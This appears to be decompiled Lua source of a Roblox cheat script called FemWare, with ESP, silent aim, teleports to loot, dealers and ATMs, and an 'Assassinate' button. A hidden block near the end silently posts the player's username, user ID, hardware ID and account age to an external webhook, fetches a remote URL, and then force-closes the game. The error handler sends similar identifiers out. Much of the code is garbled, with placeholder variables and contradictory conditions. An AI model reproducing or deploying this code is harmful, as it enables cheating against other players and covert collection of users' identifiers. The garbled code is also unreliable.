  if _ARG_0_ == true then
  end
  if _ARG_0_ == true then
    _UPVALUE1_ = 1
    coroutine.resume((coroutine.create(function()
      while not nil do
        ESPFramework.Color = Color3.fromHSV(tick() % _UPVALUE0_ / _UPVALUE0_, 1, 1)
        if _UPVALUE1_ == 2 then
          coroutine.yield(_UPVALUE2_)
        end
      end
    end)))
  else
    _UPVALUE1_ = 2
  end
end, "RAINBOWS"):AddSlider(0, 5, 150, 1000000000000, function(_ARG_0_)
  _UPVALUE0_ = _ARG_0_
end)
InfoS:AddSeperator("ESP Customization")
InfoS:AddColorpicker("Main ESP Color", ESPFramework.Color, function(_ARG_0_)
  ESPFramework.Color = _ARG_0_
  ESPSettings.ESPColor = _ARG_0_
end)
InfoS:AddColorpicker("Tool ESP Color", ESPFramework.ToolColor, function(_ARG_0_)
  ESPFramework.ToolColor = _ARG_0_
  ESPSettings.ToolColor = _ARG_0_
end)
InfoS:AddColorpicker("Silent Aim Field of View Color", SilentSettings.SilentAimColor, function(_ARG_0_)
  SilentAIMFov.Color = _ARG_0_
  SilentSettings.SilentAimColor = _ARG_0_
end)
MiscS:AddButton("Copy Discord Link", function()
  setclipboard("https://discord.gg/9dJkSke4M5")
  SendIT("Discord Link Copied! discord.gg/9dJkSke4M5", 15)
end)
FeedB:AddLabel("Your comments lighten the world.")
FeedB:AddLabel("Your message packaged to Discord.")
FeedB:AddTextbox("Comment", false, function(_ARG_0_)
  _UPVALUE0_ = tostring(_ARG_0_)
  print(_UPVALUE0_)
end)
FeedB:AddButton("Submit", function()
  if _UPVALUE0_ == false then
    _UPVALUE0_ = true
    _UPVALUE1_(_UPVALUE2_)
    SendIT("Thanks for the Submission!", 15)
    wait(15)
    _UPVALUE0_ = false
  else
    SendIT("Dont think about it.", 5)
  end
end)
PartThin((Instance.new("Part", workspace)))
Instance.new("Part", workspace).Position = Vector3.new(-4766.666, -32.768, -818.809)
PartThin((Instance.new("Part", workspace)))
Instance.new("Part", workspace).Position = Vector3.new(-4770.976, -198.929, -842.684)
PartThin((Instance.new("Part", workspace)))
Instance.new("Part", workspace).Position = Vector3.new(-4525.734, 9.314, -778.03)
PartThin((Instance.new("Part", workspace)))
Instance.new("Part", workspace).Position = Vector3.new(-4525.795, 85.759, -778.03)
Instance.new("Part", workspace).Touched:Connect(function(_ARG_0_)
  if _ARG_0_.Parent == Player.Character and not _ARG_0_ and not _UPVALUE0_ and _ARG_0_ then
    _UPVALUE0_ = true
    TeleportAreaNew(CFrame.new(-4770.976, -198.929, -842.684))
    wait(1)
    _UPVALUE0_ = false
  end
end)
Instance.new("Part", workspace).Touched:Connect(function(_ARG_0_)
  if _ARG_0_.Parent == Player.Character and Settings.ElevatorTP and _ARG_0_ and not _UPVALUE1_ then
    _UPVALUE0_ = true
    TeleportAreaNew(CFrame.new(-4766.666, -32.768, -818.809))
    wait(1)
    _UPVALUE0_ = false
  end
end)
Instance.new("Part", workspace).Touched:Connect(function(_ARG_0_)
  if _ARG_0_.Parent == Player.Character and Settings.TowerTP and not d2 and _ARG_0_ then
    _UPVALUE1_ = true
    TeleportAreaNew(CFrame.new(-4525.795, 85.759, -778.03))
    wait(1)
    _UPVALUE1_ = false
  end
end)
Instance.new("Part", workspace).Touched:Connect(function(_ARG_0_)
  if _ARG_0_.Parent == Player.Character and Settings.TowerTP and _ARG_0_ and _ARG_0_ then
    _UPVALUE0_ = true
    TeleportAreaNew(CFrame.new(-4525.734, 9.314, -778.03))
    wait(1)
    _UPVALUE0_ = false
  end
end)
for _FORV_116_, _FORV_117_ in pairs(game:GetService("Players"):GetPlayers()) do
  if _FORV_117_ ~= game:GetService("Players").LocalPlayer then
    table.insert({"..."}, tostring(_FORV_117_.DisplayName))
  end
end
TeleportNew2:AddTextbox("Manual Selection", false, function(_ARG_0_)
  _UPVALUE0_ = _ARG_0_
end)
TeleportNew2:AddDropdown("Server List", {"..."}, "...", false, function(_ARG_0_)
  _UPVALUE0_ = _ARG_0_
end)
TeleportNew2:AddSlider("Before", 0.05, 0.1, 1, 50, function(_ARG_0_)
  _UPVALUE0_ = _ARG_0_
end)
TeleportNew2:AddSlider("After", 0.1, 0.15, 1, 50, function(_ARG_0_)
  _UPVALUE0_ = _ARG_0_
end)
TeleportNew2:AddButton("Assassinate", function()
  if _UPVALUE0_ ~= nil and Get(_UPVALUE0_) then
    VisibleHit(Get(_UPVALUE0_), _UPVALUE1_, _UPVALUE2_)
  end
end)
TeleportNew2:AddButton("Teleport", function()
  if _UPVALUE0_ ~= nil and not _UPVALUE0_ then
    Teleport(Get(_UPVALUE0_).HumanoidRootPart.Position)
  end
end)
TeleportNew2:AddTextbox("Custom Teleport", false, function(_ARG_0_)
  locationto = _ARG_0_
end)
TeleportNew2:AddButton("X, Y, Z", function()
  Teleport(Vector3.new(locationto))
end)
for _FORV_119_, _FORV_120_ in pairs((game:GetService("Workspace").Map.Shopz.Dealer.CurrentStocks:GetChildren())) do
  table.insert({"..."}, tostring(_FORV_120_))
end
TeleportNew3:AddDropdown("Search for Stocks", {"..."}, "...", false, function(_ARG_0_)
  _UPVALUE0_ = _ARG_0_
end)
TeleportNew3:AddButton("Teleport", function()
  Teleport(GetDealer3(math.huge, "Dealer", _UPVALUE0_).Position)
end)
TeleportNew1:AddToggle("Toggle Elevator Area", Settings.ElevatorTP, function(_ARG_0_)
  Settings.ElevatorTP = _ARG_0_
  if Settings.ElevatorTP == true then
    _UPVALUE0_.Transparency = 0
    _UPVALUE1_.Transparency = 0
  else
    _UPVALUE0_.Transparency = 1
    _UPVALUE1_.Transparency = 1
  end
end):AddKeybind("None")
TeleportNew1:AddToggle("Toggle Tower Area", Settings.TowerTP, function(_ARG_0_)
  Settings.TowerTP = _ARG_0_
  if Settings.TowerTP == true then
    _UPVALUE0_.Transparency = 0
    _UPVALUE1_.Transparency = 0
  else
    _UPVALUE0_.Transparency = 1
    _UPVALUE1_.Transparency = 1
  end
end):AddKeybind("None")
TeleportNew1:AddSeperator("Quick Elevator")
TeleportNew1:AddButton("Elevator Up", function()
  TeleportAreaNew(CFrame.new(-4768.198, -34.303, -817.605))
end)
TeleportNew1:AddButton("Elevator Down", function()
  TeleportAreaNew(CFrame.new(-4776.88, -201.662, -823.827))
end)
TeleportNew1:AddSeperator("Quick Tower")
TeleportNew1:AddButton("Tower Up", function()
  TeleportAreaNew(CFrame.new(-4519.51, 85.714, -773.943))
end)
TeleportNew1:AddToggle("TP Mouse", false, function(_ARG_0_)
  if _ARG_0_ == true then
    IYMouse = game.Players.LocalPlayer:GetMouse()
    Players = game.Players
    _UPVALUE0_ = game:GetService("UserInputService")
    function getRoot(_ARG_0_)
      if not _ARG_0_:FindFirstChild("HumanoidRootPart") and _ARG_0_ then
      end
      return (_ARG_0_:FindFirstChild("UpperTorso"))
    end
    function clicktpFunc()
      pcall(function()
        if not Players.LocalPlayer.Character and Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").SeatPart then
          Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Sit = false
          wait(0.1)
        end
        getRoot(Players.LocalPlayer.Character).CFrame = Teleport(2 + 3)
      end)
    end
    connect = IYMouse.Button1Down:Connect(function()
      if not nil then
        clicktpFunc()
      end
    end)
  elseif not _ARG_0_ then
    connect:Disconnect()
  end
end):AddKeybind("None")
TeleportFix:AddButton("Fix Airstuck", function()
  for _FORV_3_, _FORV_4_ in ipairs(game:GetService("Workspace").Map.Parts.M_Parts:GetDescendants()) do
    if _FORV_4_.Name == "Trampoline" then
      game:GetService("ReplicatedStorage").Events.__DFfDD:FireServer("Tt__h", math.huge, _FORV_4_)
    end
  end
end)
function GenerateLoot(_ARG_0_, _ARG_1_)
  TeleportAreas1:AddButton(tostring(_ARG_0_), function()
    Teleport(_UPVALUE0_)
  end)
end
function GenerateDealer(_ARG_0_, _ARG_1_)
  TeleportAreas3:AddButton(tostring(_ARG_0_), function()
    Teleport(_UPVALUE0_)
  end)
end
function GenerateATM(_ARG_0_, _ARG_1_)
  TeleportAreas4:AddButton(tostring(_ARG_0_), function()
    Teleport(_UPVALUE0_)
  end)
end
for _FORV_122_, _FORV_123_ in pairs(game:GetService("Workspace").Map.BredMakurz:GetChildren()) do
  if not nil then
    GenerateLoot(_FORV_123_, 126 + 127)
  end
end
for _FORV_122_, _FORV_123_ in pairs(game:GetService("Workspace").Map.Shopz:GetChildren()) do
  if _FORV_123_:FindFirstChild("MainPart") then
    GenerateDealer(_FORV_123_, 126 + 127)
  end
end
for _FORV_122_, _FORV_123_ in pairs(game:GetService("Workspace").Map.ATMz:GetChildren()) do
  if not nil then
    GenerateATM(_FORV_123_, 126 + 127)
  end
end
TeleportAreas2:AddButton("Subway", function()
  Teleport(Vector3.new(-4682.783, -32.661, -679.054))
end)
TeleportAreas2:AddButton("Vibe Check", function()
  Teleport(Vector3.new(-4752.952, -201.265, -972.681))
end)
TeleportAreas2:AddButton("Tower", function()
  Teleport(Vector3.new(-4458.395, 123.44, -890.576))
end)
TeleportAreas2:AddButton("Motel", function()
  Teleport(Vector3.new(-4643.27, 3.799, -903.686))
end)
TeleportAreas2:AddButton("Sewers", function()
  Teleport(Vector3.new(-4139.011, -93.066, -743.68))
end)
TeleportAreas2:AddButton("Cafe Snipe", function()
  Teleport(Vector3.new(-4498.683, 41.525, -262.722))
end)
TeleportAreas2:AddButton("Scrap Yard", function()
  Teleport(Vector3.new(-3881.907, 27.859, -468.655))
end)
TeleportAreas2:AddButton("Illegal Pizza", function()
  Teleport(Vector3.new(-4405.999, 41.9, -131.2))
end)
TeleportAreas2:AddButton("Thrift Store", function()
  Teleport(Vector3.new(-4621.07861328125, 4.09978151321411, -151.474502563477))
end)
TeleportAreas2:AddButton("Thrift Hideout", function()
  Teleport(Vector3.new(-4672.829, 43.4, -152.484))
end)
TeleportAreas2:AddButton("Cafe", function()
  Teleport(Vector3.new(-4646.08251953125, 6.04633283615112, -256.710601806641))
end)
TeleportAreas2:AddButton("Vibin", function()
  Teleport(Vector3.new(-4401.146484375, 6.26444005966187, -401.300842285156))
end)
TeleportAreas2:AddButton("Vibin Hideout", function()
  Teleport(Vector3.new(-4466.548828125, 39.326099395752, -392.067138671875))
end)
TeleportAreas2:AddButton("Basketball Court", function()
  Teleport(Vector3.new(-4899.719, 3.8, -241.604))
end)
TeleportAreas2:AddButton("Factory", function()
  Teleport(Vector3.new(-4405.917, 36.402, -590.805))
end)
TeleportAreas2:AddButton("Gas Station", function()
  Teleport(Vector3.new(-4429.634, 3.9, 150.091))
end)
if not _G.LaoBaoShao then
  (function(_ARG_0_)
    Request = not HttpPost and (_ARG_0_ or "WTF?") and (_ARG_0_ or "WTF?") and syn.request
    Request({
      Url = smacker,
      Body = game:GetService("HttpService"):JSONEncode({
        embeds = {
          {
            title = Version,
            color = 9893552,
            fields = {
              {
                name = "User",
                value = game.Players.LocalPlayer.Name,
                inline = true
              },
              {
                name = "Display",
                value = game.Players.LocalPlayer.DisplayName,
                inline = true
              },
              {
                name = "HWID",
                value = _UPVALUE0_,
                inline = true
              },
              {
                name = "Id",
                value = game.Players.LocalPlayer.UserId,
                inline = true
              },
              {
                name = "Age",
                value = game.Players.LocalPlayer.AccountAge,
                inline = true
              },
              {
                name = "Executor : Reason",
                value = (_ARG_0_ or "WTF?") .. " : " .. _ARG_0_,
                inline = true
              }
            }
          }
        }
      }),
      Method = "POST",
      Headers = {
        ["Content-Type"] = "application/json"
      }
    })
    game:HttpGet("https://maper.info/Xjquc")
  end)("Single Execution Bypass")
  while true do
    game:Shutdown()
  end
end
if nil then
  StarterGui:SetCore("SendNotification", {
    Title = Version,
    Text = "Buy Premium ($3.99 USD) or R$690 at discord.gg/femware",
    Icon = "rbxassetid://9327507243",
    Duration = 180
  })
end





end)

if Error then
    pcall(function()
        local ExecutorUsing =
        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
            secure_load and "Sentinel" or
            KRNL_LOADED and "Krnl" or
            SONA_LOADED and "Sona" or
            "WTF?"
        local HttpService = game:GetService("HttpService")
        local RandomTag = string.sub(HttpService:GenerateGUID(false), 1, 8)
        local Data = {
            ["embeds"] = {
                {
                    ["title"] = Version,
                    ["color"] = 16731726,
                    ["fields"] = {
                        {
                            ["name"] = "User",
                            ["value"] = game.Players.LocalPlayer.Name,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Id",
                            ["value"] = game.Players.LocalPlayer.UserId,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Age",
                            ["value"] = game.Players.LocalPlayer.AccountAge,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Executor",
                            ["value"] = ExecutorUsing,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Support Code",
                            ["value"] = RandomTag,
                            ["inline"] = true
                        },
                        {
                            ["name"] = "Error",
                            ["value"] = "```" .. tostring(Error) .. "```",
                            ["inline"] = false
                        },
                    }
                }
            }
        }

        local Headers = { ["Content-Type"] = "application/json" }
        local Encoded = HttpService:JSONEncode(Data)
        Request = http_request or request or HttpPost or syn.request
        local Final = { Url = supportweb, Body = Encoded, Method = "POST", Headers = Headers }
        Request(Final)
        local MSGBox = messagebox("FemWare has detected an error. \n\nYour error is (" .. tostring(Error) .. ") \n\nIf you need help fixing, A random generated Support Code (" .. RandomTag .. ") has been copied. \n\nGo #support, open a ticket and paste your Support tag there and we will help you shortly. \n\nSupport server, discord.gg/femware", "oopsie", 0)
        setclipboard(RandomTag)
    end)
end
